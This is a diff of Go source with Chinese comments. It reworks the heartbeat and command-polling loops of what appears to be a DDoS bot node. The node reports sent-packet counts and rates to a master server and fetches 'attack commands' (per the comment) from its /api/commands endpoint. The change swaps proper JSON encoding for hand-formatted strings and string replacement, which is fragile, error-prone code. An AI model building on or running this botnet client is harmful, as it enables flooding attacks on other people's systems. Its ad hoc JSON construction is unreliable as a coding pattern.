@@ -56,48 +56,39 @@ func sendHeartbeat() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		// 使用map[string]string而非interface{}来避免转义问题
-		heartbeatData := map[string]string{
-			"serverId": fmt.Sprintf("%d", config.ServerID),
-			"apiKey":   config.APIKey,
-		}
-		
-		// 单独添加数值型数据
-		packetData := map[string]interface{}{
-			"packetsSent": atomic.LoadUint64(&packetsSent),
-			"packetsRate": atomic.LoadUint64(&packetsRate),
-		}
+		// 构建心跳数据 - 使用 []byte 和 json.RawMessage 避免特殊字符被转义
+		jsonStr := fmt.Sprintf(`{
+			"serverId": %d,
+			"apiKey": %s,
+			"packetsSent": %d,
+			"packetsRate": %d
+		}`, 
+		config.ServerID,
+		json.RawMessage(fmt.Sprintf("%q", config.APIKey)),
+		atomic.LoadUint64(&packetsSent),
+		atomic.LoadUint64(&packetsRate))
 
 		// 添加当前任务信息（如果有）
 		taskMutex.RLock()
-		if activeTask != nil {
-			packetData["activeTaskId"] = activeTask.ID
+		hasTask := activeTask != nil
+		var taskID int
+		if hasTask {
+			taskID = activeTask.ID
 		}
 		taskMutex.RUnlock()
-		
-		// 合并数据
-		completeData := make(map[string]interface{})
-		for k, v := range heartbeatData {
-			completeData[k] = v
-		}
-		for k, v := range packetData {
-			completeData[k] = v
+
+		if hasTask {
+			// 简单字符串替换，插入任务ID
+			jsonStr = strings.Replace(jsonStr, "}", fmt.Sprintf(`, "activeTaskId": %d}`, taskID), 1)
 		}
 
 		// 构建心跳URL
 		heartbeatURL := fmt.Sprintf("%s/api/heartbeat", config.MasterURL)
 
-		// 编码请求数据
-		jsonData, err := json.Marshal(completeData)
-		if err != nil {
-			log.Printf("编码心跳数据失败: %v", err)
-			continue
-		}
-
 		// 发送心跳请求
-		log.Printf("发送心跳: %s (发送数据: %s)", heartbeatURL, string(jsonData))
+		log.Printf("发送心跳: %s (发送数据: %s)", heartbeatURL, jsonStr)
 		
-		req, err := http.NewRequest("POST", heartbeatURL, bytes.NewBuffer(jsonData))
+		req, err := http.NewRequest("POST", heartbeatURL, strings.NewReader(jsonStr))
 		if err != nil {
 			log.Printf("创建心跳请求失败: %v", err)
 			continue
@@ -105,8 +96,6 @@ func sendHeartbeat() {
 		
 		// 设置请求头
 		req.Header.Set("Content-Type", "application/json")
-		
-		// 不再额外添加URL参数以避免特殊字符问题
 		
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
@@ -130,26 +119,20 @@ func sendHeartbeat() {
 // 监听攻击命令
 func listenForCommands() {
 	for {
-		// 构建命令URL和请求体
+		// 构建命令URL和请求体 - 使用原始字符串避免特殊字符被转义
 		commandURL := fmt.Sprintf("%s/api/commands", config.MasterURL)
 		
-		// 使用map[string]string而非interface{}以避免不必要的转义
-		requestData := map[string]string{
-			"serverId": fmt.Sprintf("%d", config.ServerID),
-			"apiKey":   config.APIKey,
-		}
-		
-		// 编码请求数据
-		jsonData, err := json.Marshal(requestData)
-		if err != nil {
-			log.Printf("编码请求数据失败: %v", err)
-			time.Sleep(5 * time.Second)
-			continue
-		}
+		// 使用原始JSON字符串
+		jsonStr := fmt.Sprintf(`{
+			"serverId": %d,
+			"apiKey": %s
+		}`, 
+		config.ServerID,
+		json.RawMessage(fmt.Sprintf("%q", config.APIKey)))
 		
 		// 发送命令请求
-		log.Printf("获取命令: %s (发送数据: %s)", commandURL, string(jsonData))
-		req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(jsonData))
+		log.Printf("获取命令: %s (发送数据: %s)", commandURL, jsonStr)
+		req, err := http.NewRequest("POST", commandURL, strings.NewReader(jsonStr))
 		if err != nil {
 			log.Printf("创建请求失败: %v", err)
 			time.Sleep(5 * time.Second)
@@ -158,8 +141,6 @@ func listenForCommands() {
 		
 		// 设置请求头
 		req.Header.Set("Content-Type", "application/json")
-		
-		// 不再额外添加URL参数以避免特殊字符问题
 		
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
